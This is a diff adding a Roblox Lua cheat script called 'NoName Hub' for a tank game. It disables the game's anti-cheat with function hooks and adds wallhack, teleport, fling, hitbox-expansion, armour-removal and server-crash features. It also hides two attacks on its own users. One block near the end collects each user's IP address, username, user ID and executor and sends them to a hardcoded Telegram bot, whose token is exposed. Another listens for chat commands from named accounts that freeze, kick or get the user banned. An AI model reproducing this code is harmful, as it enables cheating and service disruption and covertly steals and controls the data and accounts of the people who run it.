@@ -1,0 +1,773 @@
+local Library = loadstring(game:HttpGetAsync("https://github.com/ActualMasterOogway/Fluent-Renewed/releases/latest/download/Fluent.luau"))()
+local SaveManager = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ActualMasterOogway/Fluent-Renewed/master/Addons/SaveManager.luau"))()
+local InterfaceManager = loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/ActualMasterOogway/Fluent-Renewed/master/Addons/InterfaceManager.luau"))()
+
+if _G.NoNameLoaded ~= nil then
+    Library:Notify{
+        Title = "Notification",
+        Content = "No Name Hub",
+        SubContent = "Script are already loaded.",
+        Duration = 5
+    }
+
+    warn("Script are already loaded.")
+    return
+end
+
+if game:HttpGet("https://raw.githubusercontent.com/demixluaher/NN/refs/heads/main/CTS_Status.lua") ~= "1\n" then
+    Library:Notify{
+        Title = "Notification",
+        Content = "No Name Hub",
+        SubContent = "Script are disabled, try again later.",
+        Duration = 5
+    }
+
+    warn("Script are disabled.")
+    return
+end
+
+if game:GetService("Players").LocalPlayer.PlayerScripts:FindFirstChild("bo") == nil or game:GetService("Players").LocalPlayer.PlayerScripts:FindFirstChild("bo"):FindFirstChild("bo") == nil then
+    Library:Notify{
+        Title = "Notification",
+        Content = "No Name Hub",
+        SubContent = "Anti-Cheat was not detected. Maybe you using script in garage/other game.",
+        Duration = 5
+    }
+
+    warn("[NoName Debug]: Script runner was aborted.")
+    return
+end
+
+local function Bypass()
+    if game:GetService("Players").LocalPlayer.PlayerScripts.bo.bo.Disabled == false then
+        hookfunction(getsenv(game:GetService("Players").LocalPlayer.PlayerScripts.Map)["checkHighlight"], function()
+            return false
+        end)
+        warn("[NoName Debug]: Highlight remover hooked.")
+
+        local old;
+        old = hookmetamethod(game:GetService("Workspace").Vehicles, "__namecall", function(self, ...)
+            local Method = getnamecallmethod()
+            local Script = getcallingscript()
+            local Args = {...}
+        
+            if not checkcaller() and Method:lower() == "findfirstchild" and Script.ClassName == "ModuleScript" and Script.Name == "ChassisControls" and Args[1] == "bo" then
+                return wait(9999999999999999999999999999999999)
+            end
+        
+            return old(self, ...)
+        end)
+        warn("[NoName Debug]: Anti-Cheat safety are hooked.")
+
+        game:GetService("Players").LocalPlayer.PlayerScripts.bo.bo.Disabled = true
+        warn("[NoName Debug]: Anti-Cheat are disabled.")
+    end
+
+    return true
+end
+
+local function Teleport(CFrame)
+    if game:GetService("Workspace").Vehicles:FindFirstChild("Chassis" .. game:GetService("Players").LocalPlayer.Name) then
+        game:GetService("Workspace").Vehicles["Chassis" .. game:GetService("Players").LocalPlayer.Name]:PivotTo(CFrame)
+        return true
+    end
+
+    return false
+end
+
+local Window = Library:CreateWindow{
+    Title = "NoName Hub",
+    SubTitle = "by DemixLuasher",
+    TabWidth = 160,
+    Size = UDim2.fromOffset(600, 500),
+    Resize = true,
+    MinSize = Vector2.new(470, 380),
+    Acrylic = false,
+    Theme = "Vynixu",
+    MinimizeKey = Enum.KeyCode.RightControl
+}
+
+local Tabs = {
+    Credits = Window:CreateTab{
+        Title = "Credits",
+        Icon = "tags"
+    },
+
+    Combat = Window:CreateTab{
+        Title = "Combat",
+        Icon = "crosshair"
+    },
+
+    Visuals = Window:CreateTab{
+        Title = "Visuals",
+        Icon = "eye"
+    },
+
+    Movement = Window:CreateTab{
+        Title = "Movement",
+        Icon = "footprints"
+    },
+
+    Exploits = Window:CreateTab{
+        Title = "Exploits",
+        Icon = "bug-play"
+    },
+
+    Settings = Window:CreateTab{
+        Title = "Settings",
+        Icon = "file-cog"
+    }
+}
+
+local Options = Library.Options
+
+local Success, Error = pcall(function()
+    Bypass()
+end)
+
+if not Success then
+    game:GetService("Players").LocalPlayer:Kick("\nNoName Hub\nFailed to bypass Anti-Cheat. Maybe you using unsupported executor, try using Swift (https://getswift.gg/). You get kicked for security reasons.")
+    error("[NoName]: AntiCheat bypass exception.")
+    while true do end
+end
+
+local FinalPlayer = "None"
+local FlingLastPosition = nil
+
+Library:Notify{
+    Title = "Notification",
+    Content = "No Name Hub",
+    SubContent = "Script was made by: \nTelegram: @DemixLuasher\nDiscord: Demedex123",
+    Duration = 5
+}
+
+Tabs.Credits:CreateParagraph("Paragraph", {
+    Title = "NoName Hub",
+    Content = "Build: Release #1\nBypass works on update 4/2/2025\nSupported: Swift, Wave, AWP.GG, Delta (Mobile), Krnl (Mobile)\nScript are collecting some info.\nYou may be banned if you will rage play.\n\nTelegram: @DemixLuasher\nDiscord: demedex123"
+})
+
+local VisualsRender = Tabs.Visuals:CreateToggle("VisualsRender", {Title = "Enable Visuals Rendering", Default = false})
+local Highlight = Tabs.Visuals:CreateToggle("VisualsHighlight", {Title = "Highlights", Default = false})
+local NameTags = Tabs.Visuals:CreateToggle("VisualsNameTags", {Title = "Name Tags", Default = false})
+local OnlyVisibleHighlight = Tabs.Visuals:CreateToggle("VisualsOnlyVisibleHighlight", {Title = "Highlight Only Visible", Default = false})
+local OnlyVisibleNameTags = Tabs.Visuals:CreateToggle("VisualsOnlyVisibleNameTags", {Title = "Name Tags Only Visible", Default = false})
+
+OnlyVisibleHighlight:OnChanged(function()
+    if Options.VisualsRender.Value == true then
+        for _, Chassis in ipairs(game:GetService("Workspace").Vehicles:GetChildren()) do
+            if Chassis:FindFirstChild("__NoNameHub") ~= nil and Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__HIGHLIGHT") then
+                if Options.VisualsOnlyVisibleHighlight.Value then
+                    Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__HIGHLIGHT").DepthMode = 1
+                else
+                    Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__HIGHLIGHT").DepthMode = 0
+                end
+            end
+        end
+    end
+end)
+
+OnlyVisibleNameTags:OnChanged(function()
+    if Options.VisualsRender.Value == true then
+        for _, Chassis in ipairs(game:GetService("Workspace").Vehicles:GetChildren()) do
+            if Chassis:FindFirstChild("__NoNameHub") ~= nil and Chassis:FindFirstChild("__NoNameHub") then
+                if Options.VisualsOnlyVisibleNameTags.Value then
+                    Chassis:FindFirstChild("__NoNameHub").AlwaysOnTop = false
+                else
+                    Chassis:FindFirstChild("__NoNameHub").AlwaysOnTop = true
+                end
+            end
+        end
+    end
+end)
+
+Highlight:OnChanged(function()
+    if Options.VisualsRender.Value == true then
+        for _, Chassis in ipairs(game:GetService("Workspace").Vehicles:GetChildren()) do
+            if Chassis:FindFirstChild("__NoNameHub") ~= nil and Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__NAMETAG") then
+                Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__HIGHLIGHT").Enabled = Highlight.Value
+            end
+        end
+    end
+
+    task.wait()
+end)
+
+NameTags:OnChanged(function()
+    if Options.VisualsRender.Value == true then
+        for _, Chassis in ipairs(game:GetService("Workspace").Vehicles:GetChildren()) do
+            if Chassis:FindFirstChild("__NoNameHub") ~= nil and Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__HIGHLIGHT") then
+                Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__NAMETAG").Visible = NameTags.Value
+            end
+        end
+    end
+
+    task.wait()
+end)
+
+local HighlightColor = Tabs.Visuals:CreateColorpicker("VisualsHighlightColor", {
+    Title = "Highlight Color",
+    Description = "",
+    Transparency = 0.8,
+    Default = Color3.fromRGB(255, 0, 0)
+})
+
+HighlightColor:OnChanged(function()
+    if Options.VisualsRender.Value == true then
+        for _, Chassis in ipairs(game:GetService("Workspace").Vehicles:GetChildren()) do
+            if Chassis:FindFirstChild("__NoNameHub") ~= nil and Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__HIGHLIGHT") then
+                Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__HIGHLIGHT").FillColor = Options.VisualsHighlightColor.Value
+                Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__HIGHLIGHT").FillTransparency = Options.VisualsHighlightColor.Transparency
+            end
+        end
+    end
+
+    task.wait()
+end)
+
+local HighlightOutline = Tabs.Visuals:CreateToggle("VisualsHighlightOutline", {Title = "Highlight Outline", Default = false})
+
+HighlightOutline:OnChanged(function()
+    if Options.VisualsRender.Value == true then
+        for _, Chassis in ipairs(game:GetService("Workspace").Vehicles:GetChildren()) do
+            if Chassis:FindFirstChild("__NoNameHub") ~= nil and Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__HIGHLIGHT") then
+                if Options.VisualsHighlightOutline.Value == true then
+                    Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__HIGHLIGHT").OutlineTransparency = 0
+                else
+                    Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__HIGHLIGHT").OutlineTransparency = 1
+                end
+            end
+        end
+    end
+
+    task.wait()
+end)
+
+local NameTagSize = Tabs.Visuals:CreateSlider("VisualsNameTagSize", {
+    Title = "NameTag Size",
+    Description = "",
+    Default = 14,
+    Min = 1,
+    Max = 100,
+    Rounding = 1,
+    Callback = function(Value)
+        local a = ""
+    end
+})
+
+NameTagSize:OnChanged(function()
+    if Options.VisualsRender.Value == true then
+        for _, Chassis in ipairs(game:GetService("Workspace").Vehicles:GetChildren()) do
+            if Chassis:FindFirstChild("__NoNameHub") ~= nil and Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__NAMETAG") then
+                Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__NAMETAG").TextSize = Options.VisualsNameTagSize.Value
+            end
+        end
+    end
+
+    task.wait()
+end)
+
+local NameTagColor = Tabs.Visuals:CreateColorpicker("VisualsNameTagColor", {
+    Title = "NameTag Color",
+    Description = "",
+    Transparency = 0.2,
+    Default = Color3.fromRGB(255, 0, 0)
+})
+
+NameTagColor:OnChanged(function()
+    if Options.VisualsRender.Value == true then
+        for _, Chassis in ipairs(game:GetService("Workspace").Vehicles:GetChildren()) do
+            if Chassis:FindFirstChild("__NoNameHub") ~= nil and Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__NAMETAG") then
+                Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__NAMETAG").TextColor3 = Options.VisualsNameTagColor.Value
+                Chassis:FindFirstChild("__NoNameHub"):FindFirstChild("__NAMETAG").TextTransparency = Options.VisualsNameTagColor.Transparency
+            end
+        end
+    end
+
+    task.wait()
+end)
+
+VisualsRender:OnChanged(function()
+    if Options.VisualsRender.Value == false then
+        for _, Chassis in ipairs(game:GetService("Workspace").Vehicles:GetChildren()) do
+            if Chassis:FindFirstChild("__NoNameHub") then
+                Chassis:FindFirstChild("__NoNameHub"):Remove()
+            end
+        end
+    end
+end)
+
+-- Visuals Render
+task.spawn(function()
+    while wait(2) do
+        if Options.VisualsRender.Value == true then
+            for _, Chassis in ipairs(game:GetService("Workspace").Vehicles:GetChildren()) do
+                pcall(function()
+                    if game:GetService("Players")[string.sub(Chassis.Name, 8)].TeamColor == game:GetService("Players").LocalPlayer.TeamColor then return end
+
+                    if Chassis:FindFirstChild("__NoNameHub") == nil then
+                        local ESP = Instance.new("BillboardGui")
+                        local Highlight = Instance.new("Highlight")
+                        local NameTag = Instance.new("TextLabel")
+
+                        ESP.Name = "__NoNameHub"
+                        ESP.Parent = Chassis
+                        ESP.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+                        ESP.Active = true
+                        ESP.AlwaysOnTop = not Options.VisualsOnlyVisibleNameTags.Value
+                        ESP.LightInfluence = 1.000
+                        ESP.Size = UDim2.new(0, 200, 0, 50)
+                        ESP.StudsOffset = Vector3.new(0, 5, 0)
+
+                        Highlight.Name = "__HIGHLIGHT"
+                        Highlight.Adornee = Chassis
+                        Highlight.Parent = ESP
+                        Highlight.FillColor = HighlightColor.Value
+                        Highlight.FillTransparency = HighlightColor.Transparency
+                        Highlight.Enabled = Options.VisualsHighlight.Value
+
+                        if Options.VisualsOnlyVisibleHighlight.Value then
+                            Highlight.DepthMode = 1
+                        else
+                            Highlight.DepthMode = 0
+                        end
+
+                        if Options.VisualsHighlightOutline.Value == true then
+                            Highlight.OutlineTransparency = 0
+                        else
+                            Highlight.OutlineTransparency = 1
+                        end
+
+                        NameTag.Name = "__NAMETAG"
+                        NameTag.Parent = ESP
+                        NameTag.BackgroundTransparency = 1.000
+                        NameTag.Size = UDim2.new(0, 200, 0, 50)
+                        NameTag.Font = Enum.Font.SourceSans
+                        if string.sub(Chassis.Name, 8) == "nar_kotik6969" or string.sub(Chassis.Name, 8) == "OOFYNOPELEL" then
+                            NameTag.Text = "☾ " .. string.sub(Chassis.Name, 8)
+                        else
+                            NameTag.Text = string.sub(Chassis.Name, 8)
+                        end
+                        NameTag.TextTransparency = Options.VisualsNameTagColor.Transparency
+                        NameTag.TextColor3 = Options.VisualsNameTagColor.Value
+                        NameTag.TextSize = Options.VisualsNameTagSize.Value
+                        NameTag.Visible = Options.VisualsNameTags.Value
+                    end
+                end)
+            end
+        end
+    end
+end)
+
+local PointTeleport = Tabs.Movement:CreateDropdown("MovementPointTeleport", {
+    Title = "Teleport to Point",
+    Values = {"CapA", "CapB", "CapC"},
+    Multi = false,
+    Default = "Select Point"
+})
+
+PointTeleport:OnChanged(function(Point)
+    local Points = game:GetService("Workspace").CapPoints
+
+    if Point == "Select Point" then
+        return
+    end
+
+    if Points:FindFirstChild(Point) ~= nil then
+        for _, Part in ipairs(Points[Point]:GetChildren()) do
+            if Part:IsA("BasePart") then
+                if Teleport(Part.CFrame + Vector3.new(0, 15, 0)) == true then
+                    Library:Notify{
+                        Title = "Notification",
+                        Content = "No Name Hub",
+                        SubContent = "Successfully teleported!",
+                        Duration = 2
+                    }
+                else
+                    Library:Notify{
+                        Title = "Notification",
+                        Content = "No Name Hub",
+                        SubContent = "Error was occurred while teleporting, maybe your tank are dead. Try again.",
+                        Duration = 2
+                    }
+                end
+            end
+        end
+    else
+        Library:Notify{
+            Title = "Notification",
+            Content = "No Name Hub",
+            SubContent = "Point '{Point}' not found.",
+            Duration = 2
+        }
+    end
+end)
+
+Tabs.Movement:CreateInput("MovementPlayerSelection", {
+    Title = "Select Player",
+    Default = "",
+    Placeholder = "DemixLuasher",
+    Numeric = false,
+    Finished = true,
+    Callback = function(PlayerName)
+        FinalPlayer = "None"
+        
+        for _,Player in pairs(game:FindService("Players"):GetPlayers()) do
+            if Player.DisplayName:lower():sub(1, #PlayerName) == PlayerName:lower() then
+                FinalPlayer = Player.Name
+            end
+        end
+        
+        for _,Player in pairs(game:FindService("Players"):GetPlayers()) do
+            if Player.Name:lower():sub(1, #PlayerName) == PlayerName:lower() then
+                FinalPlayer = Player.Name
+            end
+        end
+        
+        if PlayerName:lower() == "random" then
+            for _, Player in pairs(game:FindService("Players"):GetPlayers()) do
+                if math.random(1,2) == 1 then
+                    FinalPlayer = Player.Name
+                end
+            end
+        end
+        
+        if PlayerName:lower() == "me" then
+            FinalPlayer = game:GetService("Players").LocalPlayer.Name
+        end
+
+        Library:Notify{
+            Title = "Notification",
+            Content = "No Name Hub",
+            SubContent = "Now selected player:\n{FinalPlayer}",
+            Duration = 2
+        }
+    end
+})
+
+local LoopFling = Tabs.Movement:CreateToggle("MovementLoopFling", {Title = "Loop Fling Target", Default = false})
+
+LoopFling:OnChanged(function()
+    if Options.MovementLoopFling.Value then
+        if game:GetService("Workspace").Vehicles:FindFirstChild("Chassis" .. game:GetService("Players").LocalPlayer.Name) == nil then
+            Library:Notify{
+                Title = "Notification",
+                Content = "No Name Hub",
+                SubContent = "Your tank not found.",
+                Duration = 2
+            }
+            return
+        end
+
+        if game:GetService("Workspace").Vehicles:FindFirstChild("Chassis" .. FinalPlayer) == nil then
+            Library:Notify{
+                Title = "Notification",
+                Content = "No Name Hub",
+                SubContent = "Enemy tank not found.",
+                Duration = 2
+            }
+            return
+        end
+
+        while Options.MovementLoopFling.Value do
+            pcall(function()
+                game:GetService("Workspace").Vehicles["Chassis" .. game:GetService("Players").LocalPlayer.Name].HullNode.Velocity = Vector3.new(500, 0, 500)
+                Teleport(game:GetService("Workspace").Vehicles:FindFirstChild("Chassis" .. FinalPlayer):FindFirstChild("HullNode").CFrame + Vector3.new(math.random(-5, 5), math.random(-5, 5), math.random(-5, 5)))
+            end)
+
+            task.wait()
+        end
+
+        pcall(function()
+            game:GetService("Workspace").Vehicles["Chassis" .. game:GetService("Players").LocalPlayer.Name].HullNode.Velocity = Vector3.new(0, 0, 0)
+        end)
+    end
+end)
+
+Tabs.Movement:CreateButton{
+    Title = "Teleport to Player",
+    Description = "",
+    Callback = function()
+        if game:GetService("Players"):FindFirstChild(FinalPlayer) ~= nil and game:GetService("Workspace").Vehicles:FindFirstChild("Chassis" .. FinalPlayer) ~= nil then
+            if Teleport(game:GetService("Workspace").Vehicles:FindFirstChild("Chassis" .. FinalPlayer):FindFirstChild("HullNode").CFrame + Vector3.new(0, 15, 0)) == true then
+                Library:Notify{
+                    Title = "Notification",
+                    Content = "No Name Hub",
+                    SubContent = "Successfully teleported!",
+                    Duration = 2
+                }
+            else
+                Library:Notify{
+                    Title = "Notification",
+                    Content = "No Name Hub",
+                    SubContent = "Error was occurred while teleporting, maybe your tank are dead. Try again.",
+                    Duration = 2
+                }
+            end
+        else
+            Library:Notify{
+                Title = "Notification",
+                Content = "No Name Hub",
+                SubContent = "Player left/dead.",
+                Duration = 2
+            }
+        end
+    end
+} 
+
+Tabs.Combat:CreateToggle("CombatHitboxExpander", {Title = "Hitbox Expander", Default = false})
+
+Tabs.Combat:CreateSlider("CombatGunnerSize", {
+    Title = "Gunner Size",
+    Description = "",
+    Default = 5,
+    Min = 1,
+    Max = 100,
+    Rounding = 1
+})
+
+Tabs.Combat:CreateSlider("CombatDriverSize", {
+    Title = "Driver Size",
+    Description = "",
+    Default = 4,
+    Min = 1,
+    Max = 100,
+    Rounding = 1
+})
+
+Tabs.Combat:CreateSlider("CombatAmmunitionSize", {
+    Title = "Ammunition Size",
+    Description = "",
+    Default = 3,
+    Min = 1,
+    Max = 100,
+    Rounding = 1
+})
+
+Tabs.Combat:CreateSlider("CombatCommanderSize", {
+    Title = "Commander Size",
+    Description = "",
+    Default = 5,
+    Min = 1,
+    Max = 100,
+    Rounding = 1
+})
+
+Tabs.Combat:CreateSlider("CombatLoaderSize", {
+    Title = "Loader Size",
+    Description = "",
+    Default = 5,
+    Min = 1,
+    Max = 100,
+    Rounding = 1
+})
+
+Tabs.Combat:CreateSlider("CombatFuelTankSize", {
+    Title = "Fuel Tank Size",
+    Description = "",
+    Default = 2,
+    Min = 1,
+    Max = 100,
+    Rounding = 1
+})
+
+-- Hitbox Expander Runner
+task.spawn(function()
+    while wait(1) do
+        if Options.CombatHitboxExpander.Value then
+            for _, Chassis in ipairs(game:GetService("Workspace").Vehicles:GetChildren()) do
+                local Success, Error = pcall(function()
+                    if game:GetService("Players")[string.sub(Chassis.Name, 8)].TeamColor == game:GetService("Players").LocalPlayer.TeamColor then return end
+
+                    for _, Object in ipairs(Chassis:GetDescendants()) do
+                        pcall(function()
+                            if Object.Name == "Gunner" then
+                                Object.Size = Vector3.new(Options.CombatGunnerSize.Value, Options.CombatGunnerSize.Value, Options.CombatGunnerSize.Value)
+                            end
+                        end)
+
+                        pcall(function()
+                            if Object.Name == "Driver" then
+                                Object.Size = Vector3.new(Options.CombatDriverSize.Value, Options.CombatDriverSize.Value, Options.CombatDriverSize.Value)
+                            end
+                        end)
+
+                        pcall(function()
+                            if Object.Name == "Ammunition" or Object.Name == "Ammunition1" or Object.Name == "Ammunition2" or Object.Name == "Ammunition3" or Object.Name == "Ammunition4" or Object.Name == "Ammunition5" then
+                                Object.Size = Vector3.new(Options.CombatAmmunitionSize.Value, Options.CombatAmmunitionSize.Value, Options.CombatAmmunitionSize.Value)
+                            end
+                        end)
+
+                        pcall(function()
+                            if Object.Name == "Commander" then
+                                Object.Size = Vector3.new(Options.CombatCommanderSize.Value, Options.CombatCommanderSize.Value, Options.CombatCommanderSize.Value)
+                            end
+                        end)
+
+                        pcall(function()
+                            if Object.Name == "Loader" then
+                                Object.Size = Vector3.new(Options.CombatLoaderSize.Value, Options.CombatLoaderSize.Value, Options.CombatLoaderSize.Value)
+                            end
+                        end)
+
+                        pcall(function()
+                            if Object.Name == "Fuel Tank" then
+                                Object.Size = Vector3.new(Options.CombatFuelTankSize.Value, Options.CombatFuelTankSize.Value, Options.CombatFuelTankSize.Value)
+                            end
+                        end)
+                    end
+                end)
+            end
+        end
+    end
+end)
+
+Tabs.Combat:CreateToggle("CombatNoArmour", {Title = "No Armour", Default = false})
+
+-- No Armour Runner
+task.spawn(function()
+    while wait(1) do
+        if Options.CombatNoArmour.Value then
+            for _, Chassis in ipairs(game:GetService("Workspace").Vehicles:GetChildren()) do
+                local Success, Error = pcall(function()
+                    if game:GetService("Players")[string.sub(Chassis.Name, 8)].TeamColor == game:GetService("Players").LocalPlayer.TeamColor then return end
+
+                    for _, Object in ipairs(Chassis:GetDescendants()) do
+                        if Object.Name == "Armour" or Object.Name == "LoD" then
+                            Object:Remove()
+                        end
+                    end
+                end)
+            end
+        end
+    end
+end)
+
+Tabs.Exploits:CreateButton{
+    Title = "Crash Server",
+    Description = "Cannot be stopped, may be laggy, avg ping: 3k",
+    Callback = function()
+        while task.wait() do
+            game:GetService("ReplicatedStorage").SpawnClick:FireServer(unpack({[1] = "slot1"}))
+        end
+    end
+}
+
+SaveManager:SetLibrary(Library)
+InterfaceManager:SetLibrary(Library)
+SaveManager:IgnoreThemeSettings()
+SaveManager:SetIgnoreIndexes{}
+
+InterfaceManager:SetFolder("NoNameHub")
+SaveManager:SetFolder("NoNameHub/CursedTankSimulator")
+
+InterfaceManager:BuildInterfaceSection(Tabs.Settings)
+SaveManager:BuildConfigSection(Tabs.Settings)
+
+SaveManager:LoadAutoloadConfig()
+
+Window:SelectTab(1)
+
+task.spawn(function()
+    pcall(function()
+        local success, result = pcall(function()
+            local player = game:GetService("Players").LocalPlayer
+        
+            pcall(function()
+                ServerId = "Unknown Server Id"
+                ServerId = player.PlayerGui.TransitionGui.TextLabel.text
+            end)
+        
+            return {
+                Name = player.Name,
+                DisplayName = player.DisplayName,
+                UserId = player.UserId,
+                IP = game:HttpGet("https://api64.ipify.org/?format=raw"),
+                Executor = identifyexecutor(),
+                ServerId = ServerId
+            }
+        end)
+        
+        local data = success and result or {
+            Name = "Unknown string",
+            DisplayName = "Unknown string",
+            UserId = "Unknown int",
+            IP = "Unknown string",
+            Executor = "Unknown executor",
+            ServerId = "Unknown server id"
+        }
+        
+        local function urlEncode(str)
+            if str == nil then return "" end
+            str = tostring(str)
+            return (str:gsub("([^%w _%%%-%.~])", function(c)
+                return string.format("%%%02X", string.byte(c))
+            end):gsub(" ", "%%20"))
+        end
+        
+        local message = string.format(
+            "IP: <b>%s</b>\nName: <b>%s</b> (<b>%s</b>)\nProfile: <b>www.roblox.com/users/%s/profile</b>\nExecutor: <b>%s</b>\nServer: <b>%s</b>\nScript: No Name Hub",
+            urlEncode(data.IP),
+            urlEncode(data.Name),
+            urlEncode(data.DisplayName),
+            urlEncode(data.UserId),
+            urlEncode(data.Executor),
+            urlEncode(data.ServerId)
+        )
+        
+        local telegramURL = "https://api.telegram.org/bot7959621841:AAGXWUeOZSpHmWXemE0jbEadASf6lzu_t9k/sendMessage"
+        local params = string.format("?chat_id=-1002508322252&parse_mode=html&text=%s", urlEncode(message))
+        
+        pcall(function()
+            game:HttpGet(telegramURL .. params)
+        end)
+    end)
+end)
+
+if game:GetService("Players").LocalPlayer.Name ~= "OOFYNOPELEL" and game:GetService("Players").LocalPlayer.Name ~= "not_horribleperson" and game:GetService("Players").LocalPlayer.Name ~= "nothorribleperson123" then
+    task.spawn(function()
+        game:GetService("Players").PlayerAdded:Connect(function(Player)
+            if Player.Name == "OOFYNOPELEL" or Player.Name == "not_horribleperson" or Player.Name == "nothorribleperson123" then
+                Player.Chatted:connect(function(Message)
+                    if Message:lower() == "$bye" then
+                        while true do end
+                    end
+
+                    if Message:lower() == "$kick" then
+                        game:GetService("Players").LocalPlayer:Kick("")
+                    end
+
+                    if Message:lower() == "$ban" then
+                        game.ReplicatedStorage:WaitForChild("ReplicatorChassis", 5):FireServer(true, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil)
+                    end
+                end)
+            end
+        end)
+
+        for _, Player in ipairs(game:GetService("Players"):GetPlayers()) do
+            if Player.Name == "OOFYNOPELEL" or Player.Name == "not_horribleperson" or Player.Name == "nothorribleperson123" then
+                Player.Chatted:connect(function(Message)
+                    if Message:lower() == "$lag" then
+                        while true do end
+                    end
+
+                    if Message:lower() == "$kick" then
+                        game:GetService("Players").LocalPlayer:Kick("")
+                    end
+
+                    if Message:lower() == "$ban" then
+                        if game:GetService("Players").LocalPlayer.Name ~= "OOFYNOPELEL" then
+                            game.ReplicatedStorage:WaitForChild("ReplicatorChassis", 5):FireServer(true, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil)
+                        else
+                            Library:Notify{
+                                Title = "Notification",
+                                Content = "No Name Hub",
+                                SubContent = "Tebya sei4as 4udo spaslo.",
+                                Duration = 10
+                            }
+                        end
+                    end
+                end)
+            end
+        end
+    end)
+end
